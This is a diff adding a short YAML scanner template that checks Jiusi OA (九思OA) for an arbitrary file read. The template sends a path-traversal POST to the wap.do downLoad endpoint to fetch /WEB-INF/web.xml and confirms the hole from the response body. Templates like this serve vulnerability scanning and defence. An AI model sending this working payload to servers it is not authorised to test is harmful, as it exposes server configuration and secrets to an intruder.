@@ -1,0 +1,15 @@
+name: 九思OA-wap.do-任意文件读取
+description: >-
+  文件读取web.xml
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /jsoa/wap.do?method=downLoad
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >
+      path=../&name=&FileName=/WEB-INF/web.xml
+    expression:
+      status: 200
+      body_all: ["web-app"]
